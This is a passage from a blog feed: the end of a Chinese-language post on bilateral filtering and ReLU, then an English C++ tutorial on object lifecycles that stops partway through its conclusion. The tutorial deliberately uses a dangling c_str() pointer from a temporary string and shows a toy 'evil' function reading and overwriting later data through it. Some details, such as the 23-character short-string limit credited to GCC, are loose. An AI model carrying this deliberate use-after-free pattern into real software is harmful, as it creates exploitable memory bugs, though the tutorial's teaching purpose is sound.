<li>像素距离：双边滤波器还依赖于像素值的相似性，即越相似的像素会有更高的权重</li>
</ul>
<p>因为要计算权重，所以这个滤波器的消耗比较多。</p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><msub><mi>σ</mi><mi>d</mi></msub><mo separator="true">,</mo><msub><mi>σ</mi><mi>r</mi></msub></mrow></msub><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mi>π</mi><msubsup><mi>σ</mi><mi>d</mi><mn>2</mn></msubsup></mrow></mfrac><mi>exp</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mo>−</mo><mfrac><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup></mrow><mrow><mn>2</mn><msubsup><mi>σ</mi><mi>d</mi><mn>2</mn></msubsup></mrow></mfrac><mo fence="true">)</mo></mrow><mo>⋅</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mi>π</mi><msubsup><mi>σ</mi><mi>r</mi><mn>2</mn></msubsup></mrow></mfrac><mi>exp</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mo>−</mo><mfrac><mrow><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo>+</mo><mi>x</mi><mo separator="true">,</mo><mi>Y</mi><mo>+</mo><mi>y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mrow><mn>2</mn><msubsup><mi>σ</mi><mi>r</mi><mn>2</mn></msubsup></mrow></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">B_{\sigma_d,\sigma_r}(x, y, I(X, Y)) = \frac{1}{2\pi\sigma_d^2} \exp\left(-\frac{x^2 + y^2}{2\sigma_d^2}\right) \cdot \frac{1}{2\pi\sigma_r^2} \exp\left(-\frac{(I(X + x, Y + y) - I(X, Y))^2}{2\sigma_r^2}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:-0.0359em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0359em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.6264em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">π</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8051em;"><span style="top:-2.1528em;margin-left:-0.0359em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">d</span></span></span><span style="top:-2.8448em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3472em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6166em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">exp</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.07em;"><span style="top:-2.6264em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8051em;"><span style="top:-2.1528em;margin-left:-0.0359em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">d</span></span></span><span style="top:-2.8448em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3472em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6166em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">π</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.214em;margin-left:-0.0359em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5452em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">exp</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1089em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.214em;margin-left:-0.0359em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span><span class="mclose mtight">)</span><span class="mclose mtight"><span class="mclose mtight">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5452em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span></span></span></p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241020_000350.png"></p>
<p>双边滤波器广泛应用于图像去噪、细节增强和艺术效果生成等领域。例如，连续应用双边滤波器可以产生“卡通化”效果。</p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241020_001101.png"></p>
<blockquote>
<p>去噪</p>
</blockquote>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241020_001054.png"></p>
<blockquote>
<p>卡通化</p>
</blockquote>
<h2 id="ReLU-Rectified-Linear-Unit"><a href="#ReLU-Rectified-Linear-Unit" class="headerlink" title="ReLU - Rectified Linear Unit"></a>ReLU - Rectified Linear Unit</h2><p>就是把小于0的都变成0,在<strong>CNN</strong>中通常作为激活函数出现。</p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241020_001648.png"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li>Unless specified, all photo are coming from <strong>UBC CPSC427 slides @ Leonid Sigal</strong></li>
<li>My class note from UBC CPSC427</li>
</ul>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>computer vision</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ object lifecyle adventure</title>
    <url>/articles/coding/cpp-lifecycle-intro/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Programmer: Huh. I wonder where are my objects?</p>
<p>C++: I don&#39;t know. Objects have their own lifecycles.</p>
<blockquote>
<p>adapt from: <em>&quot;Your characters also have their own lives.&quot;</em> -by anonymous genshin impact fans<br>original: <em>《角色也有自己的生活》</em></p>
</blockquote>
<p>c++ object, contructor, deconstructor, variable scope and lifecycles.</p>
<span id="more"></span>


<h1 id="Some-Exploration"><a href="#Some-Exploration" class="headerlink" title="Some Exploration"></a>Some Exploration</h1><p>Let&#39;s start with a simple example. What is wrong with this piece of code?</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">some_external_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * cstr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> * cstr = std::<span class="built_in">string</span>(<span class="string">&quot;Hello, World!&quot;</span>).<span class="built_in">c_str</span>();</span><br><span class="line">    <span class="built_in">some_external_function</span>(cstr);</span><br><span class="line">    std::string secret_data = <span class="string">&quot;secret data&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; secret_data &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It seems like it compiles and runs correctly. Everything works properly!</p>
<p><img data-src="/images/coding/cpp-lifecycle-intro/Screenshot_20240617_095406.png" alt="asd"></p>
<p>Or does it?</p>
<p>If we add another piece of code and print out the pointer, it is supposed to contain &quot;Hello world.&quot;</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">some_external_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * cstr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> * cstr = std::<span class="built_in">string</span>( <span class="string">&quot;Hello, World!&quot;</span>).<span class="built_in">c_str</span>();</span><br><span class="line">    <span class="built_in">some_external_function</span>(cstr);</span><br><span class="line">    std::string secret_data = <span class="string">&quot;secret data&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; secret_data &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; cstr &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Instead of printing &quot;Hello world,&quot; it actually prints out &quot;secret data.&quot;</p>
<p><img data-src="/images/coding/cpp-lifecycle-intro/Screenshot_20240617_100218.png" alt="Screenshot_20240617_100218.png"></p>
<p>Furthermore, if you are using a library built by malicious individuals, they can actually steal and modify your secrets.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cstring&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> * heheh = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">some_external_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * cstr)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;external function called with &#x27;%s&#x27;\n&quot;</span>, cstr);</span><br><span class="line">    heheh = (<span class="type">char</span> *)cstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">some_evil_people</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;evil people got your secret &#x27;%s&#x27;\n&quot;</span>, heheh);</span><br><span class="line">    heheh[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span>;</span><br><span class="line">    heheh[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    heheh[<span class="number">2</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">    heheh[<span class="number">3</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    heheh[<span class="number">4</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">    heheh[<span class="number">5</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">some_external_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * cstr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> * cstr = std::<span class="built_in">string</span>( <span class="string">&quot;Hello, World!&quot;</span>).<span class="built_in">c_str</span>();</span><br><span class="line">    <span class="built_in">some_external_function</span>(cstr);</span><br><span class="line">    std::string secret_data = <span class="string">&quot;secret data&quot;</span>;</span><br><span class="line">    <span class="built_in">some_evil_people</span>();</span><br><span class="line">    std::cout &lt;&lt; secret_data &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/coding/cpp-lifecycle-intro/Screenshot_20240617_100642.png" alt="Screenshot_20240617_100642.png"></p>
<p>What&#39;s going on here?!?!</p>
<p>This is all because of C++&#39;s lifecycle.</p>
<h1 id="Let-s-go-throught-object-s-lifecycle"><a href="#Let-s-go-throught-object-s-lifecycle" class="headerlink" title="Let&#39;s go throught object&#39;s lifecycle"></a>Let&#39;s go throught object&#39;s lifecycle</h1><p>Before talking about an object&#39;s lifecycle, let&#39;s first find out where all my object data is.</p>
<p>So, as we all know, people on the internet always say the stack stores the local variables and stack frames, while the heap stores all malloced data.</p>
<p><img data-src="/images/coding/cpp-lifecycle-intro/memoryLayoutC.jpg" alt="memoryLayoutC.jpg"></p>
<blockquote>
<p>credit <a href="https://www.geeksforgeeks.org/memory-layout-of-c-program%3E">https://www.geeksforgeeks.org/memory-layout-of-c-program/</a></p>
</blockquote>
<p>Is it the same for C++ with all those complicated objects and class stuff? (Because objects are essentially structs with magic pointers and values.)</p>
<p>Not exactly.</p>
<p>Let&#39;s take a look at this program:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init_heap_address</span>();</span><br><span class="line">    <span class="built_in">init_stack_address</span>();</span><br><span class="line">    std::string s1 = <span class="string">&quot;Hello! World!&quot;</span>;</span><br><span class="line">    std::string s2 = <span class="string">&quot;Heeeeeeeeeeeeeeeeeeeeeeeeeeeeeeello, World!&quot;</span>;</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s1&quot;</span>, (<span class="type">void</span> *)&amp;s1);</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s1 cstr&quot;</span>, (<span class="type">void</span> *)s<span class="number">1.</span><span class="built_in">data</span>());</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s2&quot;</span>, (<span class="type">void</span> *)&amp;s2);</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s2 cstr&quot;</span>, (<span class="type">void</span> *)s<span class="number">2.</span><span class="built_in">data</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can see that although the object itself is indeed on the stack (we can see both <code>s1</code> and <code>s2</code> addresses are on the stack), its internal data can be somewhere else, either in the stack (<code>s1.data</code>) or in the heap (<code>s2.data</code>).</p>
<p><img data-src="/images/coding/cpp-lifecycle-intro/Screenshot_20240617_140715.png" alt="re"></p>
<p>What&#39;s going on here? How can an object have its memory sometimes in the heap and sometimes in the stack?</p>
<p>This is because <code>std::string</code> is an object, and objects have <strong>constructors</strong>.</p>
<p>Like all other OOP languages, a constructor is called when an object is created.</p>
<p>Inside the constructor, a programmer can do whatever they want, like malloc a new memory or perform some calculations.</p>
<p>In the GCC implementation of <code>std::string</code>, there are two implementations of <code>std::string</code>. One is called a short string, and the other is called a long string.</p>
<p>Depending on the string length, if it&#39;s less than 23 characters, it allocates memory on the stack. Otherwise, it allocates new memory in the heap and puts the actual string content in the heap.</p>
<p>To verify this, we can add an allocation tracker to our program.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> * <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="type">void</span> * mem = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Allocation Tracker] allocating %ld bytes at %p\n&quot;</span>, size,mem);</span><br><span class="line">    <span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> * mem)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Allocation Tracker] free memory from %p&quot;</span>, mem);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init_heap_address</span>();</span><br><span class="line">    <span class="built_in">init_stack_address</span>();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;init s1 string&quot;</span>);</span><br><span class="line">    std::string s1 = <span class="string">&quot;Hello! World!&quot;</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;init s2 string&quot;</span>);</span><br><span class="line">    std::string s2 = <span class="string">&quot;Heeeeeeeeeeeeeeeeeeeeeeeeeeeeeeello, World!&quot;</span>;</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s1&quot;</span>, (<span class="type">void</span> *)&amp;s1);</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s1 cstr&quot;</span>, (<span class="type">void</span> *)s<span class="number">1.</span><span class="built_in">data</span>());</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s2&quot;</span>, (<span class="type">void</span> *)&amp;s2);</span><br><span class="line">    <span class="built_in">print_address_location</span>(<span class="string">&quot;s2 cstr&quot;</span>, (<span class="type">void</span> *)s<span class="number">2.</span><span class="built_in">data</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Run the program again, and we can see the string object <code>malloc</code> and <code>free</code> new memory behind the scenes when the string length is long.</p>
<p><img data-src="/images/coding/cpp-lifecycle-intro/Screenshot_20240618_145039.png" alt="asdf"></p>
<p>But where does the program free the memory?</p>
<p>Here comes the <strong>destructor</strong>.</p>
<h2 id="Stack-Objects"><a href="#Stack-Objects" class="headerlink" title="Stack Objects"></a>Stack Objects</h2><p><strong>For objects inside the stack</strong>, the destructor will be called &quot;automatically&quot; when the variable goes out of scope. (There are also other cases where the destructor will be called!!!)</p>
<p>Let&#39;s see some examples.</p>
<p>Let&#39;s start with a class that tracks object construction and destruction.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Nanami</span>&#123;</span><br><span class="line">    std::string name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Nanami</span>(<span class="type">const</span> std::string&amp; name) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        std::cout &lt;&lt; name &lt;&lt;<span class="string">&quot;: owu I got created&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Nanami</span>() &#123;</span><br><span class="line">        std::cout &lt;&lt; name &lt;&lt;<span class="string">&quot;: owo I got destroyed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lol</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span><span class="number">+1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>For local variables, objects will be constructed when they are initialized and destructed when the function returns. Therefore, all allocated memory inside the object will be freed in the end, just like normal stack variables.</p>
<p><img data-src="/images/coding/cpp-lifecycle-intro/Screenshot_20240620_135358.png" alt="asd"></p>
<p>For objects inside a block, they act like local variables. When the program goes out of the block, the object calls the destructor and frees all the memory.</p>
<p><img data-src="/images/coding/cpp-lifecycle-intro/Screenshot_20240620_135850.png"></p>
<p>For xvalue scope, it calls the destructor when the statement finishes.</p>
<p><img data-src="/images/coding/cpp-lifecycle-intro/Screenshot_20240620_141735.png"></p>
<p>However, things are very different when you allocate <strong>objects on the heap</strong>.</p>
<h2 id="Heap-Objects"><a href="#Heap-Objects" class="headerlink" title="Heap Objects"></a>Heap Objects</h2><p>For objects on the heap, their lifecycle is fully controlled by the programmer. This means the object is constructed when the programmer uses <code>new</code> and destructed when the programmer uses <code>delete</code>.</p>
<p>The destructor only runs when <code>delete</code> is invoked.</p>
<p>So normally, if you create a new object and then delete it at the end, everything is fine.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">good_procedure</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Nanami * mynanami = <span class="keyword">new</span> <span class="built_in">Nanami</span>(<span class="string">&quot;mynanami&quot;</span>);</span><br><span class="line">    <span class="keyword">delete</span> mynanami;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>But if your object goes out of scope and you no longer have access to it, it creates a dangling pointer and causes a memory leak in the program.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">block_memory_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        Nanami * onheap = <span class="keyword">new</span> <span class="built_in">Nanami</span>(<span class="string">&quot;leak inside block&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>In conclusion:</p>
<ol>
<li><p>Local (stack) objects, which are allocated within a function on the stack, have their lifetimes managed by the compiler. This means their destruction time is determined: when the program completes a certain code scope.</p>
</li>
